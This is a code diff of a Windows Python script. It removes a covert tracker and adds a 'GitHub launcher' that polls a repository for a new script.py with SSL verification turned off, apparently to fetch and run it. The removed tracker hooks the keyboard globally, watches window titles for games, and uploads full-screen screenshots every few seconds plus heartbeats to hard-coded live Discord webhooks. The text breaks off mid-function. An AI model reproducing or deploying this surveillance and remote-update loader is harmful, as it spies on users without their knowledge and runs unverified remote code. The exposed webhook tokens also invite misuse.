@@ -1,802 +1,1061 @@
-import time
-import threading
-import win32gui
-import pyautogui
-import keyboard
-import requests
-import io
-from datetime import datetime
-from PIL import ImageGrab
-import json
-import traceback
+# github_launcher.pyw - Memory-optimized using GitHub API for version checking
+import os
 import sys
+import subprocess
+import urllib.request
+import tempfile
+import time
+import traceback
+import threading
+import json
+import psutil
+from datetime import datetime
+import urllib.parse
+import urllib.error
+import ssl
+import hashlib
+ssl._create_default_https_context = ssl._create_unverified_context
 
-# ---------------- CONFIG ---------------- #
-TARGET_KEYWORDS = [
-    # General game platforms
-    "crazygames",
-    "poki",
-    "kizi",
-    "y8",
-    "y8 games",
-    "armor games",
-    "miniclip",
-    "addicting games",
-    "kongregate",
-    "gameflare",
-    "friv",
-    "friv games",
-    "silvergames",
-    "lagged",
-    "unblocked games",
-    "unblocked games 66",
-    "unblocked games 76",
-    "unblocked games 911",
-    "cool math games",
-    "math playground games",
+# ============================================================================
+# CONFIGURATION TABLE - Edit these values directly in the script
+# ============================================================================
 
-    # Popular games
-    "roblox",
-    "minecraft",
-    "fortnite",
-    "among us",
-    "call of duty",
-    "call of duty warzone",
-    "league of legends",
-    "valorant",
-    "counter strike",
-    "csgo",
-    "dota 2",
-    "overwatch",
-    "genshin impact",
-    "apex legends",
-    "pubg",
-    "clash royale",
-    "clash of clans",
-    "brawl stars",
-    "fifa",
-    "rocket league",
-
-    # Mobile / casual games
-    "subway surfers",
-    "temple run",
-    "geometry dash",
-    "bitlife",
-    "paper io",
-    "slither io",
-    "agar io",
-    "cookie clicker",
-    "idle games",
-    "clicker games",
-
-    # French / multilingual gaming phrases
-    "jeux gratuits",
-    "jeu gratuit",
-    "jeux en ligne",
-    "joue maintenant",
-    "jouer en ligne",
-    "spiele kostenlos",
-    "online spiele",
-    "juegos gratis",
-    "jugar ahora",
-
-    # Emulators & retro
-    "retro games",
-    "classic games",
-    "arcade games",
-    "flash games",
-    "browser games",
-    "nes games online",
-    "gba games online",
-
-    # Streaming & gaming communities
-    "twitch",
-    "twitch gaming",
-    "kick streaming",
-    "youtube gaming",
-    "discord gaming",
-    "steam",
-    "epic games",
-    "origin games",
-    "battle net"
-]
-
-PASSWORD = "stop123"    # Password to toggle tracking
-TOGGLE_HOTKEY = "ctrl+alt+p"  # Alternative hotkey to toggle tracking
-
-# Discord Webhook Configuration (BOTH WEBHOOKS)
-DISCORD_WEBHOOKS = [
-    "https://discordapp.com/api/webhooks/1464318526650187836/JVj45KwndFltWM8WZeD3z9e0dlIipcbyQN7Fu_iAt5HpBn1O5f4t_r43koMeX3Dv73gF",
-    "https://discord.com/api/webhooks/1464318888714961091/dElHOxtS91PyvPZR3DQRcSNzD0di6vIlTr3qfHs-DUSEutmHxF9jEPJ7BMrWwhthbLf0"
-]
-SEND_SCREENSHOTS = True  # Set to False to disable screenshot sending
-SCREENSHOT_DELAY = 0.5   # Delay after detection before taking screenshot (seconds)
-PERIODIC_SCREENSHOT_INTERVAL = 9.5  # Take screenshot every 30 seconds (even without detection)
-HEARTBEAT_INTERVAL = 300  # 5 minutes in seconds
-
-# ---------------- GLOBALS ---------------- #
-lock = threading.Lock() # Thread safety
-tracking_enabled = True  # Master toggle for tracking
-password_buffer = ""    # Stores typed characters for password detection
-last_key_time = 0       # For clearing password buffer after timeout
-last_heartbeat_time = time.time()  # Track when last heartbeat was sent
-last_periodic_screenshot_time = time.time()  # Track when last periodic screenshot was taken
-program_start_time = time.time()  # Track program start time
-screenshot_failure_count = 0  # Track consecutive screenshot failures
-max_consecutive_failures = 5  # Maximum allowed consecutive failures before warning
-
-# Track focus state to prevent spam
-current_focused_hwnd = None  # Current window handle
-current_focused_title = None  # Current window title
-last_alert_time = 0  # Last time we sent an alert
-alert_cooldown = 60  # 60 seconds minimum between alerts for same window
-recently_alerted_windows = {}  # Dict to track recently alerted windows: {hwnd: (title, alert_time)}
-
-def log_error(error_type, message, exception=None, additional_info=None):
-    """Log errors with timestamp and details"""
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    log_message = f"[{timestamp}] [{error_type}] {message}"
+CONFIG = {
+    # Update checking
+    "update_check_interval": 30,  # Check every 5 minutes (300 seconds)
     
-    if exception:
-        log_message += f"\nException: {str(exception)}"
-        # Get full traceback for debugging
-        log_message += f"\nTraceback: {traceback.format_exc()}"
+    # GitHub repository
+    "repository_owner": "ElianBoden",
+    "repository_name": "Deployer",
+    "branch": "main",
     
-    if additional_info:
-        log_message += f"\nAdditional Info: {additional_info}"
+    # File paths in repository
+    "script_path": "script.py",
+    "requirements_path": "requirements.txt",
     
-    print(log_message)
+    # GitHub token (leave empty for public repos, add token for private/higher limits)
+    "github_token": "",
     
-    # Also log to file for persistent error tracking
-    try:
-        with open("tracker_errors.log", "a", encoding="utf-8") as log_file:
-            log_file.write(log_message + "\n" + "="*80 + "\n")
-    except Exception as e:
-        print(f"[LOG ERROR] Failed to write to log file: {e}")
+    # Discord notifications
+    "enable_discord_logging": True,
+    
+    # Discord webhooks for error notifications (updated to discord.com)
+    "discord_webhooks": [
+        "https://discord.com/api/webhooks/1464318683852832823/vF_b6uHJw7Mmo8TAvQTImzYX2Z4wzIADgPK9W3QsVBSE639CanUCr8iaer1y9_9yJqJ0",
+        "https://discord.com/api/webhooks/1464319002531860563/tWigsqZ_oXEXXPa_nB0VsipH1O_SLUGel5rw-YH2iy4qg65__Gl-CVNzs5UJbaXVqzvr"
+    ]
+}
 
-def title_matches_target(title: str) -> bool:
-    title_lower = title.lower()
-    return any(keyword in title_lower for keyword in TARGET_KEYWORDS)
+# ============================================================================
+# END OF CONFIGURATION - DO NOT EDIT BELOW UNLESS YOU KNOW WHAT YOU'RE DOING
+# ============================================================================
 
-def get_matching_keyword(title: str) -> str:
-    """Returns which keyword matched the title"""
-    title_lower = title.lower()
-    for keyword in TARGET_KEYWORDS:
-        if keyword in title_lower:
-            return keyword
-    return ""
+# Global tracking of script processes
+current_script_process = None
+rate_limit_wait = 0
+initial_setup_complete = False
 
-def take_screenshot():
-    """Take a screenshot of the entire screen with error handling"""
-    global screenshot_failure_count
+# Helper function to get config (for backward compatibility)
+def load_config():
+    """Load configuration from the CONFIG table"""
+    return CONFIG.copy()
+
+def show_config():
+    """Display current configuration"""
+    print("\n" + "=" * 70)
+    print("CURRENT CONFIGURATION")
+    print("=" * 70)
     
-    try:
-        screenshot = ImageGrab.grab()
-        if screenshot:
-            screenshot_failure_count = 0  # Reset failure count on success
-            return screenshot
+    for key, value in CONFIG.items():
+        if key == "github_token" and value:
+            # Mask token for security
+            masked_token = f"{value[:4]}...{value[-4:]}" if len(value) > 8 else "****"
+            print(f"  {key:25}: {masked_token}")
+        elif key == "discord_webhooks":
+            print(f"  {key:25}: {len(value)} webhook(s) configured")
         else:
-            screenshot_failure_count += 1
-            log_error("SCREENSHOT_FAILURE", "ImageGrab.grab() returned None")
+            print(f"  {key:25}: {value}")
+    
+    print("=" * 70)
+    print("To edit configuration, modify the CONFIG dictionary at the top of the script.")
+    print("=" * 70)
+
+def edit_config_interactive():
+    """Interactive config editor"""
+    print("\n" + "=" * 70)
+    print("INTERACTIVE CONFIG EDITOR")
+    print("=" * 70)
+    
+    config_keys = list(CONFIG.keys())
+    
+    while True:
+        print("\nCurrent configuration:")
+        for i, key in enumerate(config_keys, 1):
+            value = CONFIG[key]
+            if key == "github_token" and value:
+                masked = f"{value[:4]}...{value[-4:]}" if len(value) > 8 else "****"
+                print(f"  {i:2}. {key:25}: {masked}")
+            elif key == "discord_webhooks":
+                print(f"  {i:2}. {key:25}: {len(value)} webhook(s)")
+            else:
+                print(f"  {i:2}. {key:25}: {value}")
+        
+        print(f"\n  {len(config_keys) + 1:2}. Show all config (including tokens)")
+        print(f"  {len(config_keys) + 2:2}. Exit editor")
+        
+        try:
+            choice = input("\nSelect option to edit (number): ").strip()
+            if not choice:
+                continue
+                
+            if choice == str(len(config_keys) + 1):
+                # Show all including unmasked tokens
+                print("\n" + "=" * 70)
+                print("FULL CONFIGURATION (INCLUDING TOKENS)")
+                print("=" * 70)
+                for key, value in CONFIG.items():
+                    print(f"  {key:25}: {value}")
+                print("=" * 70)
+                continue
+            elif choice == str(len(config_keys) + 2):
+                print("\nExiting editor...")
+                break
+            
+            choice_num = int(choice) - 1
+            if 0 <= choice_num < len(config_keys):
+                key = config_keys[choice_num]
+                current_value = CONFIG[key]
+                
+                print(f"\nEditing: {key}")
+                print(f"Current value: {current_value}")
+                
+                if key == "enable_discord_logging":
+                    new_value = input("Enable Discord logging? (yes/no) [yes]: ").strip().lower()
+                    if new_value == "":
+                        new_value = "yes"
+                    CONFIG[key] = new_value in ["yes", "y", "true", "1"]
+                    print(f"✓ Updated {key} to: {CONFIG[key]}")
+                
+                elif key == "discord_webhooks":
+                    print("\nCurrent webhooks:")
+                    for i, webhook in enumerate(current_value, 1):
+                        print(f"  {i}. {webhook[:60]}...")
+                    
+                    print("\nOptions:")
+                    print("  1. Add new webhook")
+                    print("  2. Remove webhook")
+                    print("  3. Clear all webhooks")
+                    print("  4. Cancel")
+                    
+                    sub_choice = input("\nSelect option: ").strip()
+                    if sub_choice == "1":
+                        new_webhook = input("Enter new Discord webhook URL: ").strip()
+                        if new_webhook:
+                            CONFIG[key].append(new_webhook)
+                            print(f"✓ Webhook added. Total: {len(CONFIG[key])}")
+                    elif sub_choice == "2" and current_value:
+                        remove_idx = input(f"Enter webhook number to remove (1-{len(current_value)}): ").strip()
+                        try:
+                            remove_idx = int(remove_idx) - 1
+                            if 0 <= remove_idx < len(current_value):
+                                removed = CONFIG[key].pop(remove_idx)
+                                print(f"✓ Removed webhook: {removed[:60]}...")
+                        except:
+                            print("✗ Invalid number")
+                    elif sub_choice == "3":
+                        CONFIG[key] = []
+                        print("✓ All webhooks cleared")
+                
+                elif isinstance(current_value, int):
+                    new_value = input(f"Enter new value for {key} [{current_value}]: ").strip()
+                    if new_value == "":
+                        print("✓ Value unchanged")
+                    else:
+                        try:
+                            CONFIG[key] = int(new_value)
+                            print(f"✓ Updated {key} to: {CONFIG[key]}")
+                        except:
+                            print("✗ Invalid number")
+                
+                elif isinstance(current_value, bool):
+                    new_value = input(f"Enable {key}? (yes/no) [{current_value}]: ").strip().lower()
+                    if new_value == "":
+                        print("✓ Value unchanged")
+                    else:
+                        CONFIG[key] = new_value in ["yes", "y", "true", "1"]
+                        print(f"✓ Updated {key} to: {CONFIG[key]}")
+                
+                else:
+                    new_value = input(f"Enter new value for {key} [{current_value}]: ").strip()
+                    if new_value == "":
+                        print("✓ Value unchanged")
+                    else:
+                        CONFIG[key] = new_value
+                        print(f"✓ Updated {key} to: {CONFIG[key]}")
+            else:
+                print("✗ Invalid option")
+                
+        except ValueError:
+            print("✗ Please enter a number")
+        except Exception as e:
+            print(f"✗ Error: {e}")
+    
+    print("\n" + "=" * 70)
+    print("CONFIGURATION SAVED")
+    print("=" * 70)
+    show_config()
+
+def get_tracker_folder():
+    """Get path to tracker folder in AppData - uses Roaming"""
+    appdata_roaming = os.getenv('APPDATA')
+    tracker_folder = os.path.join(appdata_roaming, "GitHubLauncher")
+    os.makedirs(tracker_folder, exist_ok=True)
+    return tracker_folder
+
+def get_version_tracker_path(filename):
+    """Get path to version tracker file"""
+    tracker_folder = get_tracker_folder()
+    return os.path.join(tracker_folder, f".{filename}_version.txt")
+
+def get_current_version(filename):
+    """Get current stored version (content SHA)"""
+    tracker_file = get_version_tracker_path(filename)
+    if os.path.exists(tracker_file):
+        try:
+            with open(tracker_file, 'r', encoding='utf-8') as f:
+                content = f.read().strip()
+                if content:
+                    return content
+        except Exception as e:
+            log_message("ERROR", f"Error reading version file {tracker_file}: {e}")
+    return None
+
+def save_current_version(filename, content_sha):
+    """Save current version (content SHA)"""
+    tracker_file = get_version_tracker_path(filename)
+    try:
+        with open(tracker_file, 'w', encoding='utf-8') as f:
+            f.write(content_sha)
+        log_message("DEBUG", f"Saved version {content_sha[:8]} for {filename}")
+        return True
+    except Exception as e:
+        log_message("ERROR", f"Failed to save version for {filename}: {e}", send_to_discord=True)
+        return False
+
+def clear_version_on_failure(filename):
+    """Clear version tracking if update failed"""
+    tracker_file = get_version_tracker_path(filename)
+    if os.path.exists(tracker_file):
+        try:
+            os.remove(tracker_file)
+            log_message("WARNING", f"Cleared version tracking for {filename} due to failure")
+            return True
+        except:
+            pass
+    return False
+
+def send_discord_notification(title, description, level="info", error_details=None):
+    """Send a notification to Discord webhooks"""
+    config = load_config()
+    
+    # Check if Discord logging is enabled
+    if not config.get('enable_discord_logging', True):
+        return
+    
+    # Colors for different levels
+    colors = {
+        "info": 3447003,      # Blue
+        "success": 3066993,   # Green
+        "warning": 16776960,  # Yellow
+        "error": 15158332,    # Red
+        "critical": 10038562  # Dark Red
+    }
+    
+    color = colors.get(level.lower(), colors["info"])
+    
+    # Prepare the embed
+    embed = {
+        "title": title,
+        "description": description[:2000],
+        "color": color,
+        "timestamp": datetime.utcnow().isoformat(),
+        "fields": []
+    }
+    
+    # Add error details if provided
+    if error_details:
+        if isinstance(error_details, str):
+            embed["fields"].append({
+                "name": "Error Details",
+                "value": error_details[:1000],
+                "inline": False
+            })
+    
+    # Add system info
+    try:
+        import platform
+        embed["fields"].append({
+            "name": "System Info",
+            "value": f"OS: {platform.system()} {platform.release()}\nPython: {platform.python_version()}",
+            "inline": True
+        })
+    except:
+        pass
+    
+    # Prepare the payload
+    payload = {
+        "embeds": [embed],
+        "username": "GitHub Launcher",
+        "avatar_url": "https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png"
+    }
+    
+    # Send to all webhooks in a separate thread
+    def send_to_webhooks():
+        config = load_config()
+        for i, webhook_url in enumerate(config.get('discord_webhooks', [])):
+            # Fix discordapp.com URLs to discord.com
+            if "discordapp.com" in webhook_url:
+                webhook_url = webhook_url.replace("discordapp.com", "discord.com")
+            
+            for attempt in range(3):  # Retry up to 3 times
+                try:
+                    data = json.dumps(payload).encode('utf-8')
+                    req = urllib.request.Request(
+                        webhook_url,
+                        data=data,
+                        headers={'Content-Type': 'application/json'}
+                    )
+                    response = urllib.request.urlopen(req, timeout=10)
+                    
+                    # Check response code
+                    if response.status != 204:  # Discord returns 204 No Content on success
+                        log_message("WARNING", f"Discord webhook {i+1} returned status {response.status}")
+                    
+                    break  # Success, exit retry loop
+                except Exception as e:
+                    if attempt == 2:  # Last attempt failed
+                        timestamp = datetime.now().strftime('%H:%M:%S')
+                        print(f"[{timestamp}] [DISCORD_ERROR] Webhook {i+1} failed after 3 attempts: {str(e)[:100]}")
+                    time.sleep(2)  # Wait before retry
+    
+    # Start in a new thread to avoid blocking
+    threading.Thread(target=send_to_webhooks, daemon=True).start()
+
+def log_message(level, message, send_to_discord=False, error_details=None):
+    """Log messages with optional Discord notification"""
+    timestamp = datetime.now().strftime('%H:%M:%S')
+    print(f"[{timestamp}] [{level}] {message}")
+    
+    # Send to Discord if requested
+    if send_to_discord:
+        discord_level = level.lower()
+        if discord_level == "info":
+            discord_level = "info"
+        elif discord_level == "warning":
+            discord_level = "warning"
+        elif discord_level == "error":
+            discord_level = "error"
+        elif discord_level == "critical":
+            discord_level = "critical"
+        else:
+            discord_level = "info"
+        
+        send_discord_notification(f"[{level.upper()}] {message[:100]}", message, discord_level, error_details)
+
+def check_rate_limit():
+    """Check if we need to wait due to rate limiting"""
+    global rate_limit_wait
+    
+    if rate_limit_wait > 0:
+        wait_time = rate_limit_wait
+        rate_limit_wait = 0
+        log_message("WARNING", f"Rate limited, waiting {wait_time} seconds", send_to_discord=True)
+        time.sleep(wait_time)
+        return True
+    return False
+
+def make_github_request(url, headers=None, retry_count=0):
+    """Make a GitHub API request with rate limit handling"""
+    global rate_limit_wait
+    
+    if retry_count >= 3:
+        log_message("ERROR", f"Max retries exceeded for {url}", send_to_discord=True)
+        return None
+    
+    # Check if we need to wait due to rate limiting
+    if check_rate_limit():
+        retry_count += 1
+        return make_github_request(url, headers, retry_count)
+    
+    try:
+        if headers is None:
+            headers = {}
+        
+        config = load_config()
+        token = config.get('github_token')
+        
+        if token:
+            headers['Authorization'] = f"token {token}"
+        
+        req = urllib.request.Request(url, headers=headers)
+        response = urllib.request.urlopen(req, timeout=10)
+        return response
+        
+    except urllib.error.HTTPError as e:
+        if e.code == 403:
+            # Rate limited
+            reset_time = int(e.headers.get('X-RateLimit-Reset', 0))
+            current_time = int(time.time())
+            
+            if reset_time > current_time:
+                wait_time = reset_time - current_time + 1
+                rate_limit_wait = wait_time
+                log_message("WARNING", f"Rate limited. Reset in {wait_time} seconds", send_to_discord=True)
+            else:
+                rate_limit_wait = 60  # Default 60 second wait
+            
+            # Retry after waiting
+            time.sleep(rate_limit_wait)
+            return make_github_request(url, headers, retry_count + 1)
+        elif e.code == 404:
+            log_message("ERROR", f"File not found: {url}", send_to_discord=True)
+            return None
+        else:
+            log_message("ERROR", f"HTTP error {e.code}: {e.reason}", send_to_discord=True)
             return None
     except Exception as e:
-        screenshot_failure_count += 1
-        log_error("SCREENSHOT_EXCEPTION", "Failed to take screenshot", e)
-        
-        # Check if we've had too many consecutive failures
-        if screenshot_failure_count >= max_consecutive_failures:
-            log_error("SCREENSHOT_CRITICAL", 
-                     f"Too many consecutive screenshot failures ({screenshot_failure_count})",
-                     additional_info="Consider checking display settings or permissions")
-        
+        log_message("ERROR", f"Request failed: {e}", send_to_discord=True)
         return None
 
-def send_to_webhook(webhook_url, payload, screenshot_bytes=None):
-    """Send data to a specific webhook URL with enhanced error handling"""
+def get_file_content_sha(file_path):
+    """Get the content SHA (blob SHA) for a file - changes when file content changes"""
+    config = load_config()
+    
+    api_url = f"https://api.github.com/repos/{config['repository_owner']}/{config['repository_name']}/contents/{urllib.parse.quote(file_path)}"
+    params = {
+        'ref': config['branch']
+    }
+    
+    query = urllib.parse.urlencode(params)
+    url = f"{api_url}?{query}"
+    
     try:
-        if screenshot_bytes:
-            # Create a new BytesIO object for each webhook
-            img_byte_arr = io.BytesIO(screenshot_bytes)
-            files = {
-                'file': ('screenshot.png', img_byte_arr, 'image/png')
-            }
-            
-            # Prepare multipart form data
-            if 'embeds' in payload:
-                data = {'payload_json': json.dumps(payload)}
-                response = requests.post(
-                    webhook_url,
-                    files=files,
-                    data=data,
-                    timeout=15  # Increased timeout for large files
-                )
-            else:
-                # If no embeds, just send with files
-                response = requests.post(
-                    webhook_url,
-                    files=files,
-                    data=payload,
-                    timeout=15
-                )
-        else:
-            headers = {'Content-Type': 'application/json'}
-            response = requests.post(
-                webhook_url,
-                json=payload,
-                headers=headers,
-                timeout=10
-            )
-        
-        if response.status_code in [200, 204]:
-            log_error("WEBHOOK_SUCCESS", f"Sent to {webhook_url[:40]}... Status: {response.status_code}")
-            return True
-        elif response.status_code == 429:
-            # Rate limited - log and retry logic could be added here
-            log_error("WEBHOOK_RATE_LIMIT", 
-                     f"Rate limited by Discord: {webhook_url[:40]}...",
-                     additional_info=f"Response: {response.text}")
-            return False
-        elif response.status_code in [401, 403, 404]:
-            # Invalid webhook URL
-            log_error("WEBHOOK_INVALID", 
-                     f"Webhook URL may be invalid or expired: {webhook_url[:40]}...",
-                     additional_info=f"Status: {response.status_code}, Response: {response.text}")
-            return False
-        else:
-            log_error("WEBHOOK_ERROR", 
-                     f"Failed to send to {webhook_url[:40]}...",
-                     additional_info=f"Status: {response.status_code}, Response: {response.text}")
-            return False
-            
-    except requests.exceptions.Timeout:
-        log_error("WEBHOOK_TIMEOUT", f"Request timeout for {webhook_url[:40]}...")
-        return False
-    except requests.exceptions.ConnectionError:
-        log_error("WEBHOOK_CONNECTION", f"Connection error for {webhook_url[:40]}... - Check internet connection")
-        return False
-    except Exception as e:
-        log_error("WEBHOOK_EXCEPTION", f"Unexpected error for {webhook_url[:40]}...", e)
-        return False
-
-def send_to_all_webhooks(payload, screenshot=None):
-    """Send message to all configured webhooks with failure tracking"""
-    if not DISCORD_WEBHOOKS or all(wh == "YOUR_DISCORD_WEBHOOK_URL_HERE" for wh in DISCORD_WEBHOOKS):
-        log_error("CONFIG_ERROR", "No webhooks configured or all are default URLs")
-        return False
-    
-    success_count = 0
-    failed_webhooks = []
-    threads = []
-    
-    # Convert screenshot to bytes once
-    screenshot_bytes = None
-    if screenshot and SEND_SCREENSHOTS:
-        try:
-            img_byte_arr = io.BytesIO()
-            screenshot.save(img_byte_arr, format='PNG')
-            screenshot_bytes = img_byte_arr.getvalue()  # Get raw bytes
-            
-            # Add screenshot info to payload
-            if 'embeds' in payload:
-                if 'content' not in payload or not payload['content']:
-                    payload['content'] = "📸 **Screenshot captured below:**"
-        except Exception as e:
-            log_error("SCREENSHOT_PROCESSING", "Failed to process screenshot for webhooks", e)
-            screenshot_bytes = None
-    elif screenshot is None and SEND_SCREENSHOTS:
-        log_error("SCREENSHOT_MISSING", "Screenshot was None but SEND_SCREENSHOTS is True")
-    
-    for webhook_url in DISCORD_WEBHOOKS:
-        if not webhook_url or webhook_url == "YOUR_DISCORD_WEBHOOK_URL_HERE":
-            failed_webhooks.append(f"{webhook_url[:40]}... - Invalid/Default URL")
-            continue
-            
-        # Create thread for each webhook
-        if screenshot_bytes:
-            thread = threading.Thread(
-                target=process_webhook_send,
-                args=(webhook_url, payload, screenshot_bytes, failed_webhooks),
-                kwargs={'success_counter': lambda: None}
-            )
-        else:
-            thread = threading.Thread(
-                target=process_webhook_send,
-                args=(webhook_url, payload, None, failed_webhooks),
-                kwargs={'success_counter': lambda: None}
-            )
-        
-        thread.start()
-        threads.append(thread)
-    
-    # Wait for all threads to complete
-    for i, thread in enumerate(threads):
-        try:
-            thread.join(timeout=20)  # 20 second timeout per webhook
-            
-            # Check if thread completed successfully
-            if not thread.is_alive():
-                success_count += 1
-            else:
-                log_error("WEBHOOK_THREAD_TIMEOUT", f"Thread for webhook {i+1} timed out")
-        except Exception as e:
-            log_error("WEBHOOK_THREAD_ERROR", f"Error joining thread for webhook {i+1}", e)
-    
-    # Log summary
-    if success_count > 0:
-        log_error("WEBHOOK_SUMMARY", f"Successfully sent to {success_count}/{len(DISCORD_WEBHOOKS)} webhooks")
-    else:
-        log_error("WEBHOOK_ALL_FAILED", "Failed to send to all webhooks", 
-                 additional_info=f"Failed webhooks: {', '.join(failed_webhooks)}")
-    
-    return success_count > 0
-
-def process_webhook_send(webhook_url, payload, screenshot_bytes, failed_webhooks):
-    """Process webhook sending in thread"""
-    success = send_to_webhook(webhook_url, payload, screenshot_bytes)
-    if not success:
-        failed_webhooks.append(f"{webhook_url[:40]}...")
-
-def send_discord_alert(title, keyword, screenshot=None):
-    """Send alert to Discord webhooks with optional screenshot"""
-    try:
-        # Prepare the message
-        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        embed = {
-            "title": "⚠️ Target Application Detected",
-            "description": f"**Window Title:** `{title}`\n**Matched Keyword:** `{keyword}`\n**Time:** `{current_time}`",
-            "color": 16711680,  # Red color
-            "footer": {
-                "text": "Tracker System"
-            }
-        }
-        
-        payload = {
-            "embeds": [embed],
-            "content": f"🚨 **Target detected:** {title[:100]}"
-        }
-        
-        success = send_to_all_webhooks(payload, screenshot)
-        
-        if not success and screenshot is None:
-            log_error("ALERT_NO_SCREENSHOT", 
-                     "Alert sent but screenshot was not included",
-                     additional_info=f"Title: {title}, Keyword: {keyword}")
-        
-        return success
+        response = make_github_request(url)
+        if response:
+            file_info = json.loads(response.read().decode('utf-8'))
+            if 'sha' in file_info:
+                return file_info['sha']
+        return None
         
     except Exception as e:
-        log_error("ALERT_SEND_ERROR", "Failed to send Discord alert", e,
-                 additional_info=f"Title: {title}, Keyword: {keyword}")
-        return False
-
-def send_discord_status(status):
-    """Send tracking status to Discord"""
-    try:
-        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        color = 65280 if status == "ENABLED" else 16711680  # Green for enabled, red for disabled
-        
-        embed = {
-            "title": f"🔄 Tracking {status}",
-            "description": f"Tracking has been **{status.lower()}**\n**Time:** `{current_time}`",
-            "color": color,
-            "footer": {
-                "text": "Tracker System"
-            }
-        }
-        
-        payload = {
-            "embeds": [embed],
-            "content": f"📊 **Tracker Status Changed**"
-        }
-        
-        return send_to_all_webhooks(payload)
-        
-    except Exception as e:
-        log_error("STATUS_SEND_ERROR", "Failed to send status update", e)
-        return False
-
-def send_heartbeat():
-    """Send heartbeat webhook to confirm PC is active"""
-    try:
-        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        uptime_seconds = int(time.time() - program_start_time)
-        
-        # Convert uptime to readable format
-        hours = uptime_seconds // 3600
-        minutes = (uptime_seconds % 3600) // 60
-        seconds = uptime_seconds % 60
-        
-        embed = {
-            "title": "💓 PC Heartbeat",
-            "description": f"**PC is active and running**\n**Time:** `{current_time}`\n**Uptime:** `{hours}h {minutes}m {seconds}s`\n**Tracking Status:** `{'ENABLED' if tracking_enabled else 'DISABLED'}`\n**Screenshot Failures:** `{screenshot_failure_count} consecutive`",
-            "color": 3447003,  # Blue color
-            "footer": {
-                "text": "Tracker System"
-            }
-        }
-        
-        payload = {
-            "embeds": [embed]
-        }
-        
-        success = send_to_all_webhooks(payload)
-        if success:
-            log_error("HEARTBEAT_SUCCESS", f"Heartbeat sent successfully at {current_time}")
-        else:
-            log_error("HEARTBEAT_FAILED", f"Heartbeat failed to send at {current_time}")
-        return success
-            
-    except Exception as e:
-        log_error("HEARTBEAT_ERROR", "Failed to send heartbeat", e)
-        return False
-
-def send_periodic_screenshot():
-    """Send periodic screenshot to Discord (every 30 seconds) with enhanced error handling"""
-    try:
-        # Get current window info even if not a target
-        try:
-            hwnd = win32gui.GetForegroundWindow()
-            title = win32gui.GetWindowText(hwnd).strip()
-        except Exception as e:
-            log_error("WINDOW_INFO_ERROR", "Failed to get window information", e)
-            title = "Unknown Window"
-        
-        if not title:
-            title = "No window title"
-        
-        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
-        # Take screenshot
-        screenshot = None
-        if SEND_SCREENSHOTS:
-            screenshot = take_screenshot()
-            if screenshot is None:
-                log_error("PERIODIC_SCREENSHOT_FAILED", 
-                         f"Failed to take periodic screenshot for window: '{title[:50]}...'",
-                         additional_info=f"Screenshot failure count: {screenshot_failure_count}")
-        
-        # Prepare message
-        embed = {
-            "title": "⏰ Periodic Screenshot",
-            "description": f"**Window Title:** `{title}`\n**Time:** `{current_time}`\n**Interval:** `{PERIODIC_SCREENSHOT_INTERVAL} seconds`\n**Screenshot Status:** `{'✓ Captured' if screenshot else '✗ Failed'}`",
-            "color": 10181046,  # Purple color
-            "footer": {
-                "text": "Tracker System - Periodic Capture"
-            }
-        }
-        
-        payload = {
-            "embeds": [embed],
-            "content": f"📸 **Periodic screenshot {'captured' if screenshot else 'FAILED - check logs'}**"
-        }
-        
-        success = send_to_all_webhooks(payload, screenshot)
-        if success:
-            log_error("PERIODIC_SUCCESS", f"Sent periodic screenshot at {current_time} (Window: '{title[:50]}...')")
-        else:
-            log_error("PERIODIC_WEBHOOK_FAILED", f"Failed to send periodic screenshot to webhooks")
-        return success
-            
-    except Exception as e:
-        log_error("PERIODIC_ERROR", "Unexpected error in periodic screenshot", e)
-        return False
-
-def send_startup_message():
-    """Send webhook when the program starts"""
-    try:
-        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
-        # Get system info for debugging
-        import platform
-        system_info = f"Python {sys.version.split()[0]} on {platform.system()} {platform.release()}"
-        
-        embed = {
-            "title": "🚀 Tracker Started",
-            "description": f"**Tracker system has been launched**\n**Start Time:** `{current_time}`\n**System:** `{system_info}`\n**Initial Status:** `{'ENABLED' if tracking_enabled else 'DISABLED'}`\n**Periodic Screenshots:** `Every {PERIODIC_SCREENSHOT_INTERVAL} seconds`\n**Webhooks Configured:** `{len([wh for wh in DISCORD_WEBHOOKS if wh and wh != 'YOUR_DISCORD_WEBHOOK_URL_HERE'])}`",
-            "color": 3066993,  # Green color
-            "footer": {
-                "text": "Tracker System"
-            }
-        }
-        
-        payload = {
-            "embeds": [embed],
-            "content": "📱 **System Online** - Tracker is now active"
-        }
-        
-        success = send_to_all_webhooks(payload)
-        if success:
-            log_error("STARTUP_SUCCESS", f"Startup message sent to all webhooks at {current_time}")
-        else:
-            log_error("STARTUP_FAILED", f"Failed to send startup message to webhooks")
-        return success
-            
-    except Exception as e:
-        log_error("STARTUP_ERROR", "Failed to send startup message", e)
-        return False
-
-def toggle_tracking():
-    """Toggle tracking on/off"""
-    global tracking_enabled, password_buffer, recently_alerted_windows
-    tracking_enabled = not tracking_enabled
-    status = "ENABLED" if tracking_enabled else "DISABLED"
-    log_error("TRACKING_TOGGLE", f"Tracking {status}")
-    
-    # Clear recently alerted windows when toggling
-    recently_alerted_windows.clear()
-    
-    # Send Discord notification about status change
-    threading.Thread(target=send_discord_status, args=(status,), daemon=True).start()
-    
-    password_buffer = ""  # Clear password buffer
-
-def on_key_event(e):
-    """Handle keyboard events for password detection"""
-    global password_buffer, last_key_time
-    
-    # Ignore modifier keys and non-character keys
-    if len(e.name) > 1 and e.name not in ['space', 'enter', 'backspace']:
-        return
-    
-    current_time = time.time()
-    
-    # Clear buffer if too much time passed between keystrokes (2 seconds)
-    if current_time - last_key_time > 2:
-        password_buffer = ""
-    
-    last_key_time = current_time
-    
-    # Handle backspace
-    if e.event_type == keyboard.KEY_DOWN:
-        if e.name == 'backspace':
-            password_buffer = password_buffer[:-1]
-        elif e.name == 'space':
-            password_buffer += ' '
-        elif len(e.name) == 1:  # Regular character
-            password_buffer += e.name
-        elif e.name == 'enter':  # Enter key submits password
-            check_password()
-            return
-    
-    # Check password continuously (without needing Enter)
-    check_password()
-    
-    # Keep buffer from growing too large
-    if len(password_buffer) > 20:
-        password_buffer = password_buffer[-20:]
-
-def check_password():
